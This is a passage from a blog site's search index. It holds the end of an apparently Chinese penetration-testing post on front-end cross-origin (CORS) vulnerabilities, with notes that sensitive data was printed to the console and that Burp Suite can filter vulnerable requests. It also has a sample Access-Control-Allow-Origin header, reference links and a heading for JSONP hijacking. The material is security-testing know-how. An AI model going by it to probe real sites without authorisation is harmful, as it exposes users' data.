operator">></span></code></pre><p>控制台成功打印出敏感信息</p><p>BP可直接过滤搜索存在漏洞的包</p><p><img src="/%5Cimages%5Cposts%5C%E5%89%8D%E7%AB%AF%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E%5Cimage-20241110174026646.png"></p><p><img src="/%5Cimages%5Cposts%5C%E5%89%8D%E7%AB%AF%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E%5Cimage-20241110174146337.png"></p><p><code>Access-Control-Allow-Origin: foo.example.org</code></p><p><strong>参考：</strong></p><p><a href="https://hupc.site/?p=988">PHP项目处理Chrome浏览器SameSite跨域问题</a></p><p><a href="https://forum.butian.net/share/2901">https://forum.butian.net/share/2901</a></p><h2 id="JSONP劫持漏洞"><a href="#JSONP劫持漏洞" class="headerlink" title="JSONP劫持漏洞"></a>JSONP劫持漏洞</h2>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
